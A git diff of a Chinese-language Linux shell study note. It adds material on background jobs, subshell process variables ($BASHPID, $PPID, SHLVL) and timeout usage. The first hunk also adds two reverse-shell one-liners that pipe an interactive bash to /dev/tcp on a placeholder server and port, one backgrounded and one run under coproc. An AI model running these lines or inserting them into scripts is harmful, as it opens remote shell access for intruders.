@@ -85,6 +85,8 @@ Linux中的用户都是按照组划分，一个用户可以属于一个组或多
 
 ```bash
 ./demo&
+(bash -i >& /dev/tcp/服务器地址/隧道端口 0>&1)&
+coproc bash -i >& /dev/tcp/服务器地址/隧道端口 0>&1 #coproc会启动新的shell进程执行命令
 ```
 
 ### （6）常用快捷键
@@ -1543,9 +1545,12 @@ for (( i=0;i<${#arr[*]};i++))
 
 * 在shell中输入bash会打开一个子shell，exit可退出子shell
 
-* /bin/bash执行脚本文件时会开启一个bash子进程，执行完脚本即从bash子进程退出。子bash的变量不会影响父bash的变量。
+* 如果脚本的第一行指定了`#!/bin/bash`或者你直接使用`bash script.sh`的形式来执行脚本，这都会启动一个新的bash进程，即子shell。执行完脚本即从bash子进程退出。子bash的变量不会影响父bash的变量。
 
   ![image-20221126030623437](https://raw.githubusercontent.com/WangKun233/ImageHost/main/image-20221126030623437.png)
+
+
+* **创建子shell时实际上也创建了一个新的进程。可以通过特殊变量`$BASHPID`来获取子shell的进程ID，而`$PPID`则表示父shell的进程ID。另外，`SHLVL`和`BASH_SUBSHELL`这两个变量可以用来跟踪嵌套的shell层数。**
 
 * 不开启bash子进程的执行方法：在当前shell以`source xx.sh`的方式引入。这样将脚本中变量至今引入当前shell，当前shell的变量将会受到影响
 
@@ -2007,7 +2012,6 @@ timeout 时间 命令/脚本
 ```
 
 > * timeout后接函数的话无效
-> * 
 
 ```bash
 timeout 10s	ping www.baidu.com	#ping命令执行10s
